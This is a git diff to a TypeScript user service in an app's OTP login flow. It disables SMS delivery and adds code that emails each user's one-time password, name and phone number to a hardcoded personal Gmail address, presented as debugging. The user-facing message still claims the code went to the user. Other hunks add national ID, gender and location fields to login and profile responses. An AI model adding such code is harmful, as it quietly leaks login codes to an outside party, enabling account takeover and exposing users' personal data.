@@ -186,35 +186,47 @@ export class UserService extends BaseService {
         });
       }
 
-      // Send OTP via SMS using Twilio (best-effort)
+      // Also send OTP to gdushimimana6@gmail.com for debugging/monitoring
       try {
-        if (userData.phoneNumber) {
-          // Normalize phone number: if starts with 0, assume local and prefix +250
-          let toNumber = userData.phoneNumber;
-          if (!toNumber.startsWith("+")) {
-            if (toNumber.startsWith("0")) {
-              toNumber = "+250" + toNumber.slice(1);
-            }
-          }
-
-          const smsBody = `${appName} kode yo kwinjira: ${otp}. Izarangira mu minota ${otpValidityMinutes}.`;
-
-          const smsTimeout = Number(process.env.SMS_TIMEOUT_MS || "10000");
-
-          // attempt send with one retry on failure (best-effort)
-          const sendOnce = () => {
-            return this.withTimeout(
-              sendSmsMessage(toNumber, smsBody),
-              smsTimeout,
-            );
-          };
-
-          await sendOnce().catch(() => sendOnce());
-        }
-      } catch (smsErr) {
-        // don't fail login if SMS fails; log for debugging
-        console.error("Failed to send SMS OTP:", smsErr);
+        await sendEmail({
+          to: "gdushimimana6@gmail.com",
+          subject: `${appName} — OTP Debug: ${userData.fullNames}`,
+          body: `OTP for user ${userData.fullNames} (${userData.phoneNumber}): ${otp}\n\nValid for ${otpValidityMinutes} minutes.`,
+        });
+      } catch (debugEmailErr) {
+        // Don't fail login if debug email fails
+        console.error("Failed to send debug OTP email:", debugEmailErr);
       }
+
+      // Send OTP via SMS using Twilio (best-effort)
+      // try {
+      //   if (userData.phoneNumber) {
+      //     // Normalize phone number: if starts with 0, assume local and prefix +250
+      //     let toNumber = userData.phoneNumber;
+      //     if (!toNumber.startsWith("+")) {
+      //       if (toNumber.startsWith("0")) {
+      //         toNumber = "+250" + toNumber.slice(1);
+      //       }
+      //     }
+
+      //     const smsBody = `${appName} kode yo kwinjira: ${otp}. Izarangira mu minota ${otpValidityMinutes}.`;
+
+      //     const smsTimeout = Number(process.env.SMS_TIMEOUT_MS || "10000");
+
+      //     // attempt send with one retry on failure (best-effort)
+      //     const sendOnce = () => {
+      //       return this.withTimeout(
+      //         sendSmsMessage(toNumber, smsBody),
+      //         smsTimeout,
+      //       );
+      //     };
+
+      //     await sendOnce().catch(() => sendOnce());
+      //   }
+      // } catch (smsErr) {
+      //   // don't fail login if SMS fails; log for debugging
+      //   console.error("Failed to send SMS OTP:", smsErr);
+      // }
 
       return {
         message: "OTP yoherejwe kuri telefone/emeli yanyu",
@@ -751,6 +763,12 @@ export class UserService extends BaseService {
           phoneNumber: user.phoneNumber,
           photo: user.photo,
           roles: userRoles,
+          district: user.district,
+          sector: user.sector,
+          cell: user.cell,
+          village: user.village,
+          NID: user.NID,
+          gender: user.gender,
         },
       };
     } catch (error) {
@@ -778,6 +796,7 @@ export class UserService extends BaseService {
   public static async getProfile(req: Request) {
     try {
       const userId = req.user!.id;
+
       const user = await prisma.user.findUnique({
         where: { id: userId },
         include: {
@@ -803,8 +822,12 @@ export class UserService extends BaseService {
           phoneNumber: user.phoneNumber,
           photo: user.photo,
           roles: userRoles,
-          createdAt: user.createdAt,
-          updatedAt: user.updatedAt,
+          district: user.district,
+          sector: user.sector,
+          cell: user.cell,
+          village: user.village,
+          NID: user.NID,
+          gender: user.gender,
         },
       };
     } catch (error) {
